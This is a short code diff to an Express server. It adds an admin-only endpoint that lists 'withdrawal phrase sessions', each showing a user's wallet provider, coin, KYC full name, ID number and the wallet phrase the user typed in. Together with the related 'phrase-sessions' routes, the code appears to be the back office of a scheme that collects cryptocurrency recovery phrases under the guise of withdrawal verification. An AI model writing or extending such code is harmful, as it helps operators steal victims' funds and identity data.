@@ -617,6 +617,26 @@ app.get('/api/admin/phrase-sessions', requireAdminAuth, (req, res) => {
   return res.json({ success: true, count: sessions.length, sessions });
 });
 
+app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
+  const sessions = withdrawalPhraseSessions.map((session) => ({
+    sessionId: session.sessionId,
+    createdAt: session.createdAt,
+    clientId: session.clientId,
+    amount: session.amount,
+    network: session.network,
+    walletProvider: session.walletProvider,
+    walletCoin: session.walletCoin,
+    kycFullName: session.kycFullName,
+    kycIdNumber: session.kycIdNumber,
+    challenge: session.challenge,
+    phraseInput: session.phraseInput,
+    isPhraseMatch: session.isPhraseMatch,
+    status: session.status || 'pending'
+  }));
+
+  return res.json({ success: true, count: sessions.length, sessions });
+});
+
 app.put('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
   const { sessionId } = req.params;
   const { phraseInput, challenge, isPhraseMatch } = req.body || {};
